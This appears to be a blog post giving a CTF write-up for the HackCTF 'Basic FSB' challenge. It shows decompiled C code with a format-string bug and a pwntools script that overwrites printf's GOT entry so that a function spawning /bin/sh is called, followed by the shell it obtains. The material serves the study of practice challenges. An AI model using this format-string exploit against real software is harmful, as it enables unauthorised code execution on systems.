---
layout: post
title: "HackCTF Basic FSB"
author: "Ph4nt0m"
categories: [WriteUp, Pwnable]
date: 2021-03-31 17:00
tag: [WriteUp, HackCTF, Pwnable]
---

# Basic FSB

## Source

```c
int flag()
{
  puts("EN)you have successfully modified the value :)");
  puts(aKr);
  return system("/bin/sh");
}

int vuln()
{
  char s[1024]; // [esp+0h] [ebp-808h]
  char format; // [esp+400h] [ebp-408h]

  printf("input : ");
  fgets(s, 1024, stdin);
  snprintf(&format, 0x400u, s);
  return printf(&format);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  vuln();
  return 0;
}
```

## Solve

```c
from pwn import *

e = ELF("./basic_fsb")
#p = process("./basic_fsb")
r = remote("ctf.j0n9hyun.xyz", 3002)
printf_got = e.got['printf']
flag = 0x80485b4
offset = 2

payload = ''
payload += fmtstr_payload(offset, {printf_got:flag})

r.sendline(payload)
r.interactive()
```

```c
➜  hackctf python basic_fsb.py
[*] '/home/ubuntu/ctf/hackctf/basic_fsb'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Opening connection to ctf.j0n9hyun.xyz on port 3002: Done
[*] Switching to interactive mode
input : EN)you have successfully modified the value :)
KR)#값조작 #성공적 #플래그 #FSB :)
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```